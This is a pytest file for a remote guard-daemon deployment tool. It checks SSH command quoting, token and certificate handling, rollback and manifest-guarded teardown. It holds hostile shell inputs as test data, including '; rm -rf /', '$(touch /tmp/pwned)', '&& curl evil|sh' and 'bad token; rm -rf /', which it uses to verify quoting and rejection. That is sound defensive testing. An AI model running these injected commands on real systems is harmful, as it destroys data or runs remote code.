"""Behaviour-level tests for Form remote-scan command construction (D1 / B5).

Previously the trigger boundary was monkeypatched wholesale, so the *actual*
commands sent to a remote shell — quoting, authorized_keys injection/revocation,
``rm -rf`` cleanup guards, guard-daemon supervision — had zero assertions. These
tests drive ``run_agent_scan`` / ``start_guard_daemon`` /
``bootstrap.ensure_key_auth`` / ``revoke_key`` through a recording
``FakeSshSession`` and assert on every command that would hit the wire.
"""

from __future__ import annotations

import os
import re
import subprocess
import time
from dataclasses import replace
from datetime import UTC, datetime
from pathlib import Path

import pytest

from kcatta_form.agent_identity_store import AgentIdentityRepository
from kcatta_form.agent_pki import AgentCertificateAuthority, AgentIdentityService
from kcatta_form.deploy import agent as deploy_agent
from kcatta_form.deploy import bootstrap
from kcatta_form.deploy import trigger as deploy_trigger
from kcatta_form.deploy._util import sh_quote
from kcatta_form.schemas import AgentCertificateBundle, AgentScope, ScanTarget

# Payloads we throw at every operator-controlled interpolation point. If any of
# these survives unquoted into a command, it can break out and run arbitrary code.
INJECTIONS = [
    "; rm -rf /",
    "`reboot`",
    "$(touch /tmp/pwned)",
    "a\nrm -rf /",
    "a b c",
    "x'y",
    "&& curl evil|sh",
]


class _Result:
    def __init__(self, stdout: str = "", stderr: str = "", status: int = 0) -> None:
        self.stdout = stdout
        self.stderr = stderr
        self.status = status

    @property
    def success(self) -> bool:
        return self.status == 0


class FakeSshSession:
    """Records every ``exec`` and serves scripted responses (no network).

    ``responses`` maps a regex (matched against the command) to a ``_Result``;
    the first match wins. Unmatched commands return a benign success so the happy
    path proceeds. ``commands`` holds the full, ordered list of issued commands
    for behavioural assertions; ``uploads`` / ``downloads`` record transfers.
    """

    def __init__(self, responses: list[tuple[str, _Result]] | None = None) -> None:
        self.responses = responses or []
        self.commands: list[str] = []
        self.uploads: list[tuple[Path, str]] = []
        # (remote, bytes) snapshots taken at upload time — lets tests inspect a
        # file's content even after the caller deletes the local temp copy.
        self.upload_contents: list[tuple[str, bytes | None]] = []
        self.downloads: list[tuple[str, Path]] = []
        self.target = "user@host"

    def exec(self, command: str) -> _Result:
        self.commands.append(command)
        for pattern, result in self.responses:
            if re.search(pattern, command):
                return result
        if "echo __locked" in command:
            return _Result(stdout="__locked\n")
        if "echo __owner" in command:
            return _Result(stdout="__owner\n")
        if "echo __renewed" in command:
            return _Result(stdout="__renewed\n")
        if "echo __prepared" in command:
            return _Result(stdout="__previous=0\n__prepared\n")
        if "echo __rolled_back" in command:
            return _Result(stdout="__rolled_back\n")
        if "echo __committed" in command:
            return _Result(stdout="__committed\n")
        if "echo __released" in command:
            return _Result(stdout="__released\n")
        return _Result(stdout="__ok\n", status=0)

    def upload(self, local: Path, remote: str) -> None:
        try:
            content: bytes | None = Path(local).read_bytes()
        except OSError:
            content = None
        self.uploads.append((Path(local), remote))
        self.upload_contents.append((remote, content))

    def upload_bytes(self, payload: bytes, remote: str) -> None:
        self.upload_contents.append((remote, bytes(payload)))

    def download(self, remote: str, local: Path) -> None:
        self.downloads.append((remote, Path(local)))

    def __enter__(self) -> FakeSshSession:
        return self

    def __exit__(self, *_exc: object) -> None:
        pass


class LocalShellSession:
    """Execute the remote-lock shell protocol locally for concurrency tests."""

    target = "local-test"

    def exec(self, command: str) -> _Result:
        completed = subprocess.run(
            ["bash", "-c", command],
            check=False,
            capture_output=True,
            text=True,
        )
        return _Result(completed.stdout, completed.stderr, completed.returncode)


def _agent_certificate_bundle(tmp_path: Path) -> AgentCertificateBundle:
    credentials = tmp_path / "agent-credentials"
    ca = AgentCertificateAuthority.initialize(
        credentials / "agent-ca.pem",
        credentials / "agent-ca-key.pem",
    )
    service = AgentIdentityService(AgentIdentityRepository(tmp_path / "agent-identities"), ca)
    result = service.stage_for_target(
        "target-deploy-test",
        "host-deploy-test",
        [AgentScope.GUARD_EVENT],
        agent_id="agent-deploy-test",
        idempotency_key="deploy-test-generation",
    )
    assert result.bundle is not None
    return result.bundle


def _deployment_manifest() -> deploy_agent.GuardDeploymentManifest:
    return deploy_agent.GuardDeploymentManifest(
        deployment_id="a" * 32,
        identity_generation="generation-1-" + "b" * 16,
        binary_sha256="c" * 64,
        config_sha256="d" * 64,
        pid="4321",
        unit_name="kcatta-guard",
        binary_path="/var/lib/agent-guard/agentd",
        config_path="/var/lib/agent-guard/guard.json",
    )


def _uploaded_env_content(session: FakeSshSession) -> bytes:
    content = next(
        value for remote, value in session.upload_contents if "/agentd.env.tmp-" in remote
    )
    assert content is not None
    return content


# --------------------------------------------------------------------------
# B5: guard daemon supervision + liveness probe
# --------------------------------------------------------------------------


def test_guard_start_command_uses_systemd_with_restart_policy():
    cmd = deploy_agent._guard_start_command(
        "/var/lib/agent-guard/agentd",
        "/var/lib/agent-guard",
        "kcatta-guard",
        "",
        "http://form:10067",
    )
    # systemd path present with an auto-restart policy ...
    assert "systemd-run" in cmd
    assert "systemctl stop" in cmd
    assert "systemctl reset-failed" in cmd
    assert "--property=Restart=on-failure" in cmd
    assert "--unit=" in cmd
    # ... and a setsid fallback when systemd is absent.
    assert "command -v systemd-run" in cmd
    assert "setsid" in cmd
    assert "pkill -f" in cmd
    assert sh_quote("[/]var/lib/agent-guard/agentd respond") in cmd


def test_guard_start_command_quotes_upload_and_config():
    nasty_upload = "http://a; rm -rf /"
    cmd = deploy_agent._guard_start_command("/i/agentd", "/i", "kcatta-guard", "", nasty_upload)
    assert sh_quote(nasty_upload) in cmd
    assert "rm -rf /" not in cmd.replace(sh_quote(nasty_upload), "")


@pytest.mark.parametrize("bad_unit", ["a b", "a;b", "a$b", "", "a`b", "a/b"])
def test_guard_unit_name_validated(bad_unit):
    with pytest.raises(ValueError):
        deploy_agent._validate_unit_name(bad_unit)


@pytest.mark.parametrize(
    "unsafe",
    [
        "",
        "/",
        "/var",
        "relative/guard",
        "/var/lib/../etc",
        "/var/lib/guard/",
        "//var/lib/guard",
        "/var/lib/gu\nard",
    ],
)
def test_guard_install_dir_rejects_shallow_aliases_before_ssh(monkeypatch, unsafe):
    monkeypatch.setattr(
        deploy_agent.bootstrap,
        "ensure_key_auth",
        lambda *_args, **_kwargs: pytest.fail("unsafe install path reached SSH bootstrap"),
    )

    with pytest.raises(ValueError, match="Guard install directory"):
        deploy_agent.start_guard_daemon(
            deploy_agent.GuardDeployOptions(
                target="root@192.0.2.10",
                upload="http://form:10067",
                install_dir=unsafe,
            )
        )
    with pytest.raises(ValueError, match="Guard install directory"):
        deploy_agent.stop_guard_daemon(
            deploy_agent.GuardDeployOptions(
                target="root@192.0.2.10",
                upload="",
                install_dir=unsafe,
            )
        )


def test_guard_install_prepare_refuses_a_remote_symlink():
    session = FakeSshSession(
        responses=[
            (r"\[ -L /var/lib/agent-guard", _Result(stderr="unsafe", status=42)),
        ]
    )

    with pytest.raises(RuntimeError, match="private Guard install directory"):
        deploy_agent._prepare_guard_install_over(session, "/var/lib/agent-guard")

    assert "[ ! -L /var/lib/agent-guard ]" in session.commands[0]


def test_start_guard_daemon_prefers_systemd(monkeypatch, tmp_path):
    session = FakeSshSession(
        responses=[
            (r"echo __ok", _Result(stdout="__ok\n")),
            (r"sha256sum", _Result(stdout="deadbeef  x\n")),
            (r"uname -m", _Result(stdout="x86_64\n")),
            # the start command echoes the unit marker (systemd branch taken)
            (r"systemd-run", _Result(stdout="__unit=kcatta-guard\n")),
            (r"echo __active=", _Result(stdout="__active=active\n__pid=4321\n")),
            (r"systemctl show -p MainPID", _Result(stdout="4321\n")),
        ]
    )
    _patch_session(monkeypatch, session, tmp_path)
    # sha256 of the local "binary" must match the scripted remote sum.
    monkeypatch.setattr(deploy_agent, "sha256_file", lambda _p: "deadbeef")
    monkeypatch.setattr(deploy_agent, "_require_binary", lambda *_a, **_k: None)

    pid = deploy_agent.start_guard_daemon(
        deploy_agent.GuardDeployOptions(
            target="root@10.0.0.1",
            upload="http://form:10067",
            agent_binary=tmp_path / "agentd",
        )
    )
    assert pid == "4321"
    start_cmds = [c for c in session.commands if "systemd-run" in c]
    assert start_cmds, "guard start must attempt systemd-run"
    assert "--property=Restart=on-failure" in start_cmds[0]
    staged_remote = next(
        remote for local, remote in session.uploads if local == tmp_path / "agentd"
    )
    assert staged_remote.startswith("/var/lib/agent-guard/.agentd-")
    assert staged_remote.endswith(".new")
    assert start_cmds[0].index("systemctl stop") < start_cmds[0].index(
        f"mv -f {sh_quote(staged_remote)}"
    )
    lock_index = next(i for i, command in enumerate(session.commands) if "echo __locked" in command)
    baseline_status = next(
        i for i, command in enumerate(session.commands) if "echo __active=" in command
    )
    baseline_files = [
        i
        for i, command in enumerate(session.commands)
        if "test -f /var/lib/agent-guard/guard.json" in command
        or "test -f /var/lib/agent-guard/agentd.env" in command
    ]
    assert lock_index < baseline_status
    assert baseline_files and all(lock_index < index for index in baseline_files)


def test_guard_status_systemd_active():
    session = FakeSshSession(
        responses=[(r"is-active", _Result(stdout="__active=active\n__pid=9100\n"))]
    )
    status = deploy_agent._guard_status_over(session, "kcatta-guard")
    assert status.alive is True
    assert status.supervisor == "systemd"
    assert status.pid == "9100"


def test_guard_status_systemd_dead():
    session = FakeSshSession(
        responses=[(r"is-active", _Result(stdout="__active=failed\n__pid=0\n"))]
    )
    status = deploy_agent._guard_status_over(session, "kcatta-guard")
    assert status.alive is False
    assert status.supervisor == "systemd"
    assert status.pid is None


def test_guard_status_process_fallback_when_no_systemd():
    session = FakeSshSession(
        responses=[
            (r"is-active", _Result(stdout="__no_systemd\n")),
            (r"pgrep", _Result(stdout="7777\n")),
        ]
    )
    status = deploy_agent._guard_status_over(session, "kcatta-guard")
    assert status.alive is True
    assert status.supervisor == "process"
    assert status.pid == "7777"


def test_guard_status_process_fallback_is_anchored_to_install_dir():
    session = FakeSshSession(
        responses=[
            (r"is-active", _Result(stdout="__no_systemd\n")),
            (r"pgrep", _Result(stdout="7777\n")),
        ]
    )

    deploy_agent._guard_status_over(session, "kcatta-guard", "/srv/private-guard")

    command = next(item for item in session.commands if "pgrep" in item)
    assert sh_quote("[/]srv/private-guard/agentd respond") in command
    assert sh_quote("[/]srv/private-guard/agentd guard") in command
    assert "/var/lib/agent-guard" not in command
    assert "'[a]gentd" not in command


def test_guard_status_probe_command_is_quoted():
    session = FakeSshSession(
        responses=[(r"is-active", _Result(stdout="__active=active\n__pid=1\n"))]
    )
    deploy_agent._guard_status_over(session, "kcatta-guard")
    probe = session.commands[0]
    assert sh_quote("kcatta-guard") in probe
    assert "systemctl is-active" in probe


# --------------------------------------------------------------------------
# CI4: guard daemon bearer-token injection (env file, never on the argv)
# --------------------------------------------------------------------------


def test_install_guard_env_writes_token_to_0600_file_not_argv():
    session = FakeSshSession()
    env_file = deploy_agent._install_guard_env(session, "/var/lib/agent-guard", "tok_AbC-123_xyz")

    assert env_file == "/var/lib/agent-guard/agentd.env"
    # Uploaded over SFTP to a sibling temporary path, then atomically renamed.
    assert any("/agentd.env.tmp-" in remote for remote, _content in session.upload_contents)
    # ... whose content carries the token in env-file form ...
    assert _uploaded_env_content(session) == b"FORM_INGEST_TOKEN=tok_AbC-123_xyz\n"
    # ... the token NEVER appears in any command argv (ps / journal-safe) ...
    assert all("tok_AbC-123_xyz" not in cmd for cmd in session.commands)
    # ... and the final 0600 publication is an atomic same-directory rename.
    assert any(
        "chmod 600" in cmd and "mv -f" in cmd and "/agentd.env" in cmd for cmd in session.commands
    )


def test_install_guard_env_returns_none_without_token(monkeypatch):
    monkeypatch.delenv("FORM_INGEST_TOKEN", raising=False)
    session = FakeSshSession()
    assert deploy_agent._install_guard_env(session, "/i", None) is None
    assert session.uploads == []


def test_install_guard_env_falls_back_to_analyzer_env(monkeypatch):
    monkeypatch.setenv("FORM_INGEST_TOKEN", "envtoken123")
    session = FakeSshSession()
    env_file = deploy_agent._install_guard_env(session, "/i", None)
    assert env_file == "/i/agentd.env"
    assert _uploaded_env_content(session) == b"FORM_INGEST_TOKEN=envtoken123\n"


def test_install_guard_env_rejects_unsafe_token(monkeypatch):
    monkeypatch.delenv("FORM_INGEST_TOKEN", raising=False)
    session = FakeSshSession()
    # A token with shell-dangerous chars must stop deployment; silently starting
    # without auth would lose telemetry and is not an acceptable fallback.
    with pytest.raises(ValueError, match="unsafe"):
        deploy_agent._install_guard_env(session, "/i", "bad token; rm -rf /")
    assert session.uploads == []


def test_guard_start_command_injects_env_file_both_branches():
    cmd = deploy_agent._guard_start_command(
        "/i/agentd", "/i", "kcatta-guard", "", "http://form:10067", "/i/agentd.env"
    )
    q_env = sh_quote("/i/agentd.env")
    # systemd: a transient unit starts with a clean env, so the token must arrive
    # via EnvironmentFile, not an exported shell var.
    assert f"--property=EnvironmentFile={q_env}" in cmd
    # setsid fallback: source the 0600 file (set -a exports it to the child).
    assert "set -a; . " + q_env in cmd


def test_guard_start_command_without_env_file_is_backward_compatible():
    cmd = deploy_agent._guard_start_command(
        "/i/agentd", "/i", "kcatta-guard", "", "http://form:10067"
    )
    assert "EnvironmentFile" not in cmd
    assert "set -a;" not in cmd


def test_start_guard_daemon_injects_token_env(monkeypatch, tmp_path):
    session = FakeSshSession(
        responses=[
            (r"echo __ok", _Result(stdout="__ok\n")),
            (r"sha256sum", _Result(stdout="deadbeef  x\n")),
            (r"uname -m", _Result(stdout="x86_64\n")),
            (r"systemd-run", _Result(stdout="__unit=kcatta-guard\n")),
            (r"echo __active=", _Result(stdout="__active=active\n__pid=4321\n")),
            (r"systemctl show -p MainPID", _Result(stdout="4321\n")),
        ]
    )
    _patch_session(monkeypatch, session, tmp_path)
    monkeypatch.setattr(deploy_agent, "sha256_file", lambda _p: "deadbeef")
    monkeypatch.setattr(deploy_agent, "_require_binary", lambda *_a, **_k: None)

    deploy_agent.start_guard_daemon(
        deploy_agent.GuardDeployOptions(
            target="root@10.0.0.1",
            upload="http://form:10067",
            agent_binary=tmp_path / "agentd",
            api_token="secrettoken_abc",
        )
    )
    # The token env file was uploaded and the start command references it; the
    # token never leaks into any command line.
    assert any("/agentd.env.tmp-" in remote for remote, _content in session.upload_contents)
    start = next(c for c in session.commands if "systemd-run" in c)
    assert "EnvironmentFile=" in start
    assert all("secrettoken_abc" not in c for c in session.commands)


def test_install_guard_env_publishes_mtls_generation_without_legacy_token(tmp_path):
    bundle = _agent_certificate_bundle(tmp_path)
    legacy_token = "legacy-token-must-not-be-deployed"
    session = FakeSshSession()

    env_file = deploy_agent._install_guard_env(
        session,
        "/var/lib/agent-guard",
        legacy_token,
        bundle,
    )

    assert env_file == "/var/lib/agent-guard/agentd.env"
    identity_uploads = [
        (remote, content)
        for remote, content in session.upload_contents
        if f"{deploy_agent.AGENT_IDENTITY_DIR}/.staging-" in remote
    ]
    assert len(identity_uploads) == 3
    by_name = {Path(remote).name: content for remote, content in identity_uploads}
    assert by_name == {
        "client-cert.pem": bundle.certificate_pem.encode("ascii"),
        "client-key.pem": bundle.private_key_pem.encode("ascii"),
        "ca-bundle.pem": bundle.ca_certificate_pem.encode("ascii"),
    }

    env_content = _uploaded_env_content(session)
    assert env_content == (
        f"FORM_AGENT_CERT={deploy_agent.AGENT_CERT_PATH}\n"
        f"FORM_AGENT_KEY={deploy_agent.AGENT_KEY_PATH}\n"
        f"FORM_AGENT_CA={deploy_agent.AGENT_CA_PATH}\n"
    ).encode("ascii")
    assert b"FORM_INGEST_TOKEN" not in env_content
    assert legacy_token.encode() not in b"".join(
        content or b"" for _remote, content in session.upload_contents
    )

    commands = "\n".join(session.commands)
    assert f"mkdir -p {sh_quote(deploy_agent.AGENT_IDENTITY_DIR)}" in commands
    assert "chmod 700" in commands
    assert "chmod 600" in commands
    assert "mv -Tf" in commands
    assert sh_quote(deploy_agent.AGENT_IDENTITY_CURRENT) in commands
    assert legacy_token not in commands
    assert "BEGIN CERTIFICATE" not in commands
    assert "PRIVATE KEY" not in commands

    options = deploy_agent.GuardDeployOptions(
        target="root@10.0.0.1",
        upload="https://form.example",
        api_token=legacy_token,
        certificate_bundle=bundle,
    )
    assert legacy_token not in repr(options)
    assert "PRIVATE KEY" not in repr(options)


def test_start_guard_daemon_installs_mtls_paths_and_uses_environment_file(monkeypatch, tmp_path):
    bundle = _agent_certificate_bundle(tmp_path)
    session = FakeSshSession(
        responses=[
            (r"echo __ok", _Result(stdout="__ok\n")),
            (r"sha256sum", _Result(stdout="deadbeef  x\n")),
            (r"uname -m", _Result(stdout="x86_64\n")),
            (r"systemd-run", _Result(stdout="__unit=kcatta-guard\n")),
            (r"echo __active=", _Result(stdout="__active=active\n__pid=4321\n")),
            (r"systemctl show -p MainPID", _Result(stdout="4321\n")),
        ]
    )
    _patch_session(monkeypatch, session, tmp_path)
    monkeypatch.setattr(deploy_agent, "sha256_file", lambda _path: "deadbeef")
    monkeypatch.setattr(deploy_agent, "_require_binary", lambda *_args, **_kwargs: None)

    pid = deploy_agent.start_guard_daemon(
        deploy_agent.GuardDeployOptions(
            target="root@10.0.0.1",
            upload="https://form.example",
            agent_binary=tmp_path / "agentd",
            api_token="must-not-be-used",
            certificate_bundle=bundle,
        )
    )

    assert pid == "4321"
    assert _uploaded_env_content(session).startswith(b"FORM_AGENT_CERT=")
    assert b"FORM_INGEST_TOKEN" not in _uploaded_env_content(session)
    start = next(command for command in session.commands if "systemd-run" in command)
    assert "EnvironmentFile=" in start
    assert "must-not-be-used" not in "\n".join(session.commands)
    assert "PRIVATE KEY" not in "\n".join(session.commands)


def test_activation_failure_restores_previous_remote_certificate(monkeypatch, tmp_path):
    bundle = _agent_certificate_bundle(tmp_path)
    config = tmp_path / "guard.json"
    config.write_text('{"rules": []}\n', encoding="utf-8")
    session = FakeSshSession(
        responses=[
            (
                r"old=\$\(readlink",
                _Result(stdout="__previous=1\n__ok\n"),
            ),
            (r"test -f /var/lib/agent-guard/guard\.json", _Result(stdout="__y\n")),
            (r"test -f /var/lib/agent-guard/agentd\.env", _Result(stdout="__y\n")),
            (r"echo __ok", _Result(stdout="__ok\n")),
            (r"sha256sum", _Result(stdout="deadbeef  x\n")),
            (r"uname -m", _Result(stdout="x86_64\n")),
            (r"systemd-run", _Result(stdout="__unit=kcatta-guard\n")),
            (r"echo __active=", _Result(stdout="__active=active\n__pid=4321\n")),
            (r"systemctl show -p MainPID", _Result(stdout="4321\n")),
        ]
    )
    _patch_session(monkeypatch, session, tmp_path)
    monkeypatch.setattr(deploy_agent, "sha256_file", lambda _path: "deadbeef")
    monkeypatch.setattr(deploy_agent, "_require_binary", lambda *_args, **_kwargs: None)

    def fail_activation() -> None:
        raise RuntimeError("central activation failed")

    with pytest.raises(RuntimeError, match="central activation failed"):
        deploy_agent.start_guard_daemon(
            deploy_agent.GuardDeployOptions(
                target="root@10.0.0.1",
                upload="https://form.example",
                agent_binary=tmp_path / "agentd",
                config=config,
                certificate_bundle=bundle,
                activation_callback=fail_activation,
            )
        )

    rollback = next(
        command for command in session.commands if ".previous-" in command and "mv -Tf" in command
    )
    assert sh_quote(deploy_agent.AGENT_IDENTITY_CURRENT) in rollback
    # The previous daemon is restarted only after the stable pointer is restored.
    rollback_index = session.commands.index(rollback)
    restart_index = max(
        index for index, command in enumerate(session.commands) if "systemd-run" in command
    )
    assert rollback_index < restart_index
    rollback_commands = "\n".join(
        command for command in session.commands if "echo __rolled_back" in command
    )
    assert "/var/lib/agent-guard/agentd.previous-" in rollback_commands
    assert "/var/lib/agent-guard/guard.json.previous-" in rollback_commands
    assert "/var/lib/agent-guard/agentd.env.previous-" in rollback_commands
    restarted = session.commands[restart_index]
    assert "--config /var/lib/agent-guard/guard.json" in restarted
    assert "EnvironmentFile=/var/lib/agent-guard/agentd.env" in restarted


def test_identity_prepare_ln_failure_never_claims_previous_pointer(tmp_path):
    bundle = _agent_certificate_bundle(tmp_path)
    session = FakeSshSession(
        responses=[
            (
                r"old=\$\(readlink",
                _Result(stderr="symlink denied", status=1),
            )
        ]
    )

    with pytest.raises(RuntimeError, match="prepare private Agent identity"):
        deploy_agent._install_agent_identity(session, bundle)

    prepare = next(command for command in session.commands if "old=$(readlink" in command)
    assert "&& echo __previous=1" in prepare
    assert session.upload_contents == []


def test_binary_upload_exception_rolls_back_preserved_binary(monkeypatch, tmp_path):
    class UploadFailureSession(FakeSshSession):
        def upload(self, local: Path, remote: str) -> None:
            super().upload(local, remote)
            raise OSError("SFTP response lost")

    session = UploadFailureSession(
        responses=[
            (r"uname -m", _Result(stdout="x86_64\n")),
            (r"echo __active=", _Result(stdout="__active=active\n__pid=1111\n")),
        ]
    )
    _patch_session(monkeypatch, session, tmp_path)
    monkeypatch.setattr(deploy_agent, "sha256_file", lambda _path: "c" * 64)
    monkeypatch.setattr(deploy_agent, "_require_binary", lambda *_args, **_kwargs: None)

    with pytest.raises(OSError, match="response lost"):
        deploy_agent.start_guard_daemon(
            deploy_agent.GuardDeployOptions(
                target="root@10.0.0.1",
                upload="http://form:10067",
                agent_binary=tmp_path / "agentd",
            )
        )

    assert any(
        "agentd.previous-" in command and "echo __rolled_back" in command
        for command in session.commands
    )


def test_start_response_loss_rolls_back_and_restarts_previous_guard(monkeypatch, tmp_path):
    class StartResponseLossSession(FakeSshSession):
        failed = False

        def exec(self, command: str) -> _Result:
            if "systemd-run" in command and not self.failed:
                self.commands.append(command)
                self.failed = True
                raise OSError("SSH start response lost")
            return super().exec(command)

    session = StartResponseLossSession(
        responses=[
            (r"uname -m", _Result(stdout="x86_64\n")),
            (r"sha256sum", _Result(stdout="c" * 64 + "  x\n")),
            (r"systemd-run", _Result(stdout="__unit=kcatta-guard\n")),
            (r"echo __active=", _Result(stdout="__active=active\n__pid=1111\n")),
            (r"systemctl show -p MainPID", _Result(stdout="1111\n")),
        ]
    )
    _patch_session(monkeypatch, session, tmp_path)
    monkeypatch.setattr(deploy_agent, "sha256_file", lambda _path: "c" * 64)
    monkeypatch.setattr(deploy_agent, "_require_binary", lambda *_args, **_kwargs: None)

    with pytest.raises(OSError, match="start response lost"):
        deploy_agent.start_guard_daemon(
            deploy_agent.GuardDeployOptions(
                target="root@10.0.0.1",
                upload="http://form:10067",
                agent_binary=tmp_path / "agentd",
            )
        )

    assert sum("systemd-run" in command for command in session.commands) == 2
    assert any("echo __rolled_back" in command for command in session.commands)


def test_unprovable_rollback_raises_guard_deployment_uncertain(monkeypatch, tmp_path):
    class BrokenAfterStartSession(FakeSshSession):
        broken = False

        def exec(self, command: str) -> _Result:
            if "systemd-run" in command and not self.broken:
                self.commands.append(command)
                self.broken = True
                raise OSError("SSH transport closed")
            if self.broken:
                self.commands.append(command)
                raise OSError("SSH transport remains closed")
            return super().exec(command)

    session = BrokenAfterStartSession(
        responses=[
            (r"uname -m", _Result(stdout="x86_64\n")),
            (r"sha256sum", _Result(stdout="c" * 64 + "  x\n")),
            (r"echo __active=", _Result(stdout="__active=active\n__pid=1111\n")),
        ]
    )
    _patch_session(monkeypatch, session, tmp_path)
    monkeypatch.setattr(deploy_agent, "sha256_file", lambda _path: "c" * 64)
    monkeypatch.setattr(deploy_agent, "_require_binary", lambda *_args, **_kwargs: None)

    with pytest.raises(deploy_agent.GuardDeploymentUncertainError) as captured:
        deploy_agent.start_guard_daemon(
            deploy_agent.GuardDeployOptions(
                target="root@10.0.0.1",
                upload="http://form:10067",
                agent_binary=tmp_path / "agentd",
            )
        )

    assert captured.value.target == "root@10.0.0.1"
    assert len(captured.value.deployment_id) == 32
    assert captured.value.identity_generation is None


def test_install_guard_env_rejects_missing_mtls_material_before_ssh_mutation(tmp_path):
    bundle = _agent_certificate_bundle(tmp_path)
    incomplete = bundle.model_copy(update={"private_key_pem": ""})
    session = FakeSshSession()

    with pytest.raises(ValueError, match="private_key_pem must be non-empty"):
        deploy_agent._install_guard_env(session, "/i", None, incomplete)

    assert session.commands == []
    assert session.uploads == []


def test_install_guard_env_rejects_mismatched_private_key_before_upload(tmp_path):
    bundle = _agent_certificate_bundle(tmp_path)
    other = _agent_certificate_bundle(tmp_path / "other")
    mismatched = bundle.model_copy(update={"private_key_pem": other.private_key_pem})
    session = FakeSshSession()

    with pytest.raises(ValueError, match="certificate and private key do not match"):
        deploy_agent._install_guard_env(session, "/i", None, mismatched)

    assert session.commands == []
    assert session.uploads == []


def test_install_guard_env_fails_closed_when_atomic_identity_publish_fails(tmp_path):
    bundle = _agent_certificate_bundle(tmp_path)
    session = FakeSshSession(
        responses=[
            (
                r"chmod 600 .*\.staging-.*mv -Tf",
                _Result(stderr="rename denied", status=1),
            )
        ]
    )

    with pytest.raises(RuntimeError, match="atomically publish"):
        deploy_agent._install_guard_env(session, "/i", None, bundle)

    assert not any("/agentd.env.tmp-" in remote for remote, _content in session.upload_contents)
    commands = "\n".join(session.commands)
    assert "PRIVATE KEY" not in commands
    assert bundle.private_key_pem not in commands
    assert all(not local.exists() for local, _remote in session.uploads)


@pytest.mark.parametrize(
    "upload",
    [
        "http://form.example",
        "https://form.example/ingest",
        "https://form.example//",
        "https://form.example?tenant=one",
        "https://form.example#fragment",
        "https://agent@form.example",
    ],
)
def test_start_guard_daemon_rejects_non_origin_url_before_bootstrap(monkeypatch, tmp_path, upload):
    bundle = _agent_certificate_bundle(tmp_path)

    def unexpected_bootstrap(*_args, **_kwargs):
        raise AssertionError("SSH bootstrap must not run for an unsafe mTLS URL")

    monkeypatch.setattr(deploy_agent.bootstrap, "ensure_key_auth", unexpected_bootstrap)
    with pytest.raises(
        ValueError, match="(?:absolute https://|pure origin|query|fragment|userinfo)"
    ):
        deploy_agent.start_guard_daemon(
            deploy_agent.GuardDeployOptions(
                target="root@192.0.2.10",
                upload=upload,
                certificate_bundle=bundle,
            )
        )


def test_trigger_run_guard_forwards_certificate_bundle_without_changing_legacy_positionals(
    monkeypatch, tmp_path
):
    bundle = _agent_certificate_bundle(tmp_path)
    target = ScanTarget(
        target_id="target-deploy-test",
        name="deploy target",
        address="root@192.0.2.10",
        created_at=datetime.now(UTC),
    )
    captured: list[deploy_agent.GuardDeployOptions] = []

    def start(opts):
        captured.append(opts)
        return "4321"

    monkeypatch.setattr(deploy_trigger, "start_guard_daemon", start)
    monkeypatch.setattr(deploy_trigger, "_identity_for", lambda _target: Path("/managed/key"))

    result = deploy_trigger.run_guard(
        target,
        "https://form.example",
        "legacy-positional-token",
        certificate_bundle=bundle,
    )

    assert result.pid == "4321"
    assert len(captured) == 1
    assert captured[0].api_token == "legacy-positional-token"
    assert captured[0].certificate_bundle is bundle
    assert captured[0].identity == Path("/managed/key")


@pytest.mark.parametrize(
    ("field", "replacement"),
    [
        ("deployment_id", "e" * 32),
        ("identity_generation", "generation-2-" + "f" * 16),
        ("pid", "9876"),
    ],
)
def test_conditional_guard_stop_rejects_manifest_mismatch_without_teardown(
    monkeypatch, tmp_path, field, replacement
):
    expected = _deployment_manifest()
    current = replace(expected, **{field: replacement})
    session = FakeSshSession(
        responses=[
            (
                r"printf '__manifest='",
                _Result(
                    stdout="__manifest="
                    + deploy_agent._guard_manifest_bytes(current).decode("utf-8")
                ),
            )
        ]
    )
    _patch_session(monkeypatch, session, tmp_path)

    with pytest.raises(deploy_agent.GuardDeploymentConflictError, match="generation changed"):
        deploy_agent.stop_guard_daemon(
            deploy_agent.GuardDeployOptions(target="root@10.0.0.1", upload=""),
            expected_manifest=expected,
        )

    assert not any("echo __stopped" in command for command in session.commands)


def test_conditional_guard_stop_tears_down_exact_manifest(monkeypatch, tmp_path):
    expected = _deployment_manifest()
    session = FakeSshSession(
        responses=[
            (
                r"printf '__manifest='",
                _Result(
                    stdout="__manifest="
                    + deploy_agent._guard_manifest_bytes(expected).decode("utf-8")
                ),
            ),
            (r"echo __stopped", _Result(stdout="__stopped\n")),
            (r"echo __active=", _Result(stdout="__active=inactive\n__pid=0\n")),
        ]
    )
    _patch_session(monkeypatch, session, tmp_path)

    status = deploy_agent.stop_guard_daemon(
        deploy_agent.GuardDeployOptions(target="root@10.0.0.1", upload=""),
        expected_manifest=expected,
    )

    assert status.alive is False
    manifest_index = next(
        index for index, command in enumerate(session.commands) if "printf '__manifest='" in command
    )
    stop_index = next(
        index for index, command in enumerate(session.commands) if "echo __stopped" in command
    )
    assert manifest_index < stop_index
    assert "/.deployment-lock/owner" in session.commands[manifest_index]
    assert "/.deployment-lock/owner" in session.commands[stop_index]


def _proof_session(
    manifest: deploy_agent.GuardDeploymentManifest,
    *,
    live_pid: str,
    supervisor: str = "systemd",
    lineage_matches: bool = True,
    refresh_succeeds: bool = True,
) -> FakeSshSession:
    status_stdout = (
        f"__active=active\n__pid={live_pid}\n" if supervisor == "systemd" else "__no_systemd\n"
    )
    responses = [
        (
            r"printf '__manifest='",
            _Result(
                stdout="__manifest=" + deploy_agent._guard_manifest_bytes(manifest).decode("utf-8")
            ),
        ),
        (r"echo __active=", _Result(stdout=status_stdout)),
    ]
    if supervisor != "systemd":
        responses.append((r"pgrep", _Result(stdout=f"{live_pid}\n")))
    responses.extend(
        [
            (
                r"echo __guard_lineage",
                _Result(
                    stdout="__guard_lineage\n" if lineage_matches else "",
                    status=0 if lineage_matches else 1,
                ),
            ),
            (
                r"echo __manifest_pid_refreshed",
                _Result(
                    stdout="__manifest_pid_refreshed\n" if refresh_succeeds else "",
                    status=0 if refresh_succeeds else 1,
                ),
            ),
        ]
    )
    return FakeSshSession(responses=responses)


def _proof_lock() -> deploy_agent._GuardDeploymentLock:
    return deploy_agent._GuardDeploymentLock(
        path="/var/lib/agent-guard/.deployment-lock",
        owner="proof-owner",
        ttl_seconds=120,
    )


def test_systemd_pid_rollover_refreshes_manifest_only_after_full_lineage_proof():
    previous = _deployment_manifest()
    session = _proof_session(previous, live_pid="9876")

    proof = deploy_agent._guard_deployment_proof_over(
        session,
        "/var/lib/agent-guard",
        "kcatta-guard",
        lock=_proof_lock(),
    )

    assert proof.status.supervisor == "systemd"
    assert proof.status.pid == "9876"
